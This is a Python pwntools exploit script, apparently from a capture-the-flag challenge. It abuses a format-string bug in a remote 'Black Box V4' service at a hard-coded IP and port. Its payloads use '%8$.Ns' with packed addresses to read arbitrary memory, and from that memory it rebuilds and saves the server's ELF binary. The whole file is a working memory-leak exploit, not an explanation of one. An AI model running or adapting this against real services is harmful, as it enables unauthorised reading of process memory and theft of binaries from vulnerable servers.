#!/usr/bin/env python3
import argparse
import os
import struct
import time
from pwn import *

context.log_level = "info"
context.arch = "amd64"

PAD = b"Z" * 12
MENU = b"> "
PROBE_END = b"\n== Black Box V4 =="
BAD = b"\n"
DEFAULT_BASE = 0x400000
READ_CAP = 0x40
MAX_RETRIES = 8
RECONNECT_DELAY = 0.5


class BlackBoxDumper:
    def __init__(self, host, port, timeout=8, retries=MAX_RETRIES):
        self.host = host
        self.port = port
        self.timeout = timeout
        self.retries = retries
        self.r = None

    def connect(self):
        if self.r is not None:
            try:
                self.r.close()
            except Exception:
                pass
        self.r = remote(self.host, self.port)
        self.r.recvuntil(MENU, timeout=self.timeout)

    def probe(self, payload):
        if BAD in payload:
            raise ValueError("payload contains newline")
        self.r.sendline(b"1")
        self.r.recvuntil(b"Format: ", timeout=self.timeout)
        self.r.sendline(payload)
        data = self.r.recvuntil(PROBE_END, timeout=self.timeout)
        data = data[:-len(PROBE_END)]
        self.r.recvuntil(MENU, timeout=self.timeout)
        return data

    def read_at(self, addr, limit=READ_CAP):
        if BAD in p64(addr):
            raise ValueError(f"address {addr:#x} contains bad byte 0x0a")
        if limit <= 0:
            return b""
        fmt = f"%8$.{limit}s".encode()
        if len(fmt) > 16:
            raise ValueError("format string too long to keep arg8 aligned")
        marker = b"Z" * (16 - len(fmt))
        payload = fmt + marker + p64(addr)
        last_exc = None
        for attempt in range(1, self.retries + 1):
            try:
                out = self.probe(payload)
                idx = out.rfind(marker)
                return out if idx == -1 else out[:idx]
            except (EOFError, PwnlibException) as exc:
                last_exc = exc
                log.warning(
                    "read_at retry %d/%d for addr=%#x limit=%#x (%s)",
                    attempt, self.retries, addr, limit, exc.__class__.__name__
                )
                time.sleep(RECONNECT_DELAY)
                self.connect()
        raise last_exc

    def read_mem(self, addr, size):
        buf = bytearray()
        while len(buf) < size:
            cur = addr + len(buf)
            if BAD in p64(cur):
                buf += b"\x00"
                continue
            want = min(size - len(buf), READ_CAP)
            chunk = self.read_at(cur, want)
            if chunk == b"":
                buf += b"\x00"
            else:
                buf += chunk[:want]
                if len(chunk) < want and len(buf) < size:
                    buf += b"\x00"
        return bytes(buf)


def parse_elf64_header(hdr):
    if hdr[:4] != b"\x7fELF":
        raise ValueError("base address does not point to ELF header")
    if hdr[4] != 2 or hdr[5] != 1:
        raise ValueError("expected ELF64 little-endian")
    e_phoff = struct.unpack_from("<Q", hdr, 0x20)[0]
    e_shoff = struct.unpack_from("<Q", hdr, 0x28)[0]
    e_phentsize = struct.unpack_from("<H", hdr, 0x36)[0]
    e_phnum = struct.unpack_from("<H", hdr, 0x38)[0]
    e_ehsize = struct.unpack_from("<H", hdr, 0x34)[0]
    return {
        "e_ehsize": e_ehsize,
        "e_phoff": e_phoff,
        "e_shoff": e_shoff,
        "e_phentsize": e_phentsize,
        "e_phnum": e_phnum,
    }


def parse_phdrs(blob, phoff, phentsize, phnum):
    phdrs = []
    for i in range(phnum):
        off = phoff + i * phentsize
        ent = blob[off:off + phentsize]
        p_type, p_flags = struct.unpack_from("<II", ent, 0)
        p_offset, p_vaddr, p_paddr, p_filesz, p_memsz, p_align = struct.unpack_from("<QQQQQQ", ent, 8)
        phdrs.append({
            "type": p_type,
            "flags": p_flags,
            "offset": p_offset,
            "vaddr": p_vaddr,
            "paddr": p_paddr,
            "filesz": p_filesz,
            "memsz": p_memsz,
            "align": p_align,
        })
    return phdrs


def dump_region(d, out, file_off, vaddr, size, label):
    pos = 0
    while pos < size:
        step = min(READ_CAP, size - pos)
        cur_vaddr = vaddr + pos
        cur_off = file_off + pos
        chunk = d.read_mem(cur_vaddr, step)
        out[cur_off:cur_off + step] = chunk
        pos += step
        if pos % 0x400 == 0 or pos == size:
            log.info("%s progress: %#x/%#x", label, pos, size)


def rebuild_elf(d, base, include_section_headers=False):
    hdr = d.read_mem(base, 0x40)
    info = parse_elf64_header(hdr)
    log.info(
        "e_phoff=%#x e_phentsize=%#x e_phnum=%#x",
        info["e_phoff"], info["e_phentsize"], info["e_phnum"]
    )

    ph_table_size = info["e_phentsize"] * info["e_phnum"]
    ph_blob = d.read_mem(base + info["e_phoff"], ph_table_size)
    full_hdr = bytearray(max(info["e_ehsize"], info["e_phoff"] + ph_table_size))
    full_hdr[:0x40] = hdr
    full_hdr[info["e_phoff"]:info["e_phoff"] + ph_table_size] = ph_blob

    phdrs = parse_phdrs(full_hdr, info["e_phoff"], info["e_phentsize"], info["e_phnum"])

    max_end = len(full_hdr)
    for ph in phdrs:
        if ph["type"] == 1:
            max_end = max(max_end, ph["offset"] + ph["filesz"])

    if include_section_headers and info["e_shoff"]:
        shentsize = struct.unpack_from("<H", hdr, 0x3A)[0]
        shnum = struct.unpack_from("<H", hdr, 0x3C)[0]
        max_end = max(max_end, info["e_shoff"] + shentsize * shnum)

    out = bytearray(max_end)
    out[:len(full_hdr)] = full_hdr

    load_segments = [ph for ph in phdrs if ph["type"] == 1 and ph["filesz"]]
    for idx, ph in enumerate(load_segments):
        log.info(
            "dump LOAD[%d]: vaddr=%#x offset=%#x filesz=%#x memsz=%#x",
            idx, ph["vaddr"], ph["offset"], ph["filesz"], ph["memsz"]
        )
        dump_region(
            d,
            out,
            ph["offset"],
            ph["vaddr"],
            ph["filesz"],
            f"LOAD[{idx}]"
        )

    if include_section_headers and info["e_shoff"]:
        shentsize = struct.unpack_from("<H", hdr, 0x3A)[0]
        shnum = struct.unpack_from("<H", hdr, 0x3C)[0]
        shsize = shentsize * shnum
        log.info("dump section headers: shoff=%#x size=%#x", info["e_shoff"], shsize)
        dump_region(
            d,
            out,
            info["e_shoff"],
            base + info["e_shoff"],
            shsize,
            "SHDR"
        )

    return bytes(out)


def main():
    ap = argparse.ArgumentParser(description="Dump blackboxV4 ELF from format-string arbitrary read")
    ap.add_argument("host", nargs="?", default="144.79.188.39")
    ap.add_argument("port", nargs="?", type=int, default=40425)
    ap.add_argument("-b", "--base", type=lambda x: int(x, 0), default=DEFAULT_BASE)
    ap.add_argument("-o", "--output", default="chall_dump")
    ap.add_argument("--with-shdr", action="store_true")
    ap.add_argument("--timeout", type=float, default=8.0)
    ap.add_argument("--retries", type=int, default=MAX_RETRIES)
    args = ap.parse_args()

    d = BlackBoxDumper(args.host, args.port, timeout=args.timeout, retries=args.retries)
    d.connect()
    try:
        blob = rebuild_elf(d, args.base, include_section_headers=args.with_shdr)
        with open(args.output, "wb") as f:
            f.write(blob)
        log.success("saved %s (%d bytes)", args.output, len(blob))
        log.info("file type check hint: file %s", os.path.abspath(args.output))
    finally:
        if d.r is not None:
            d.r.close()


if __name__ == "__main__":
    main()
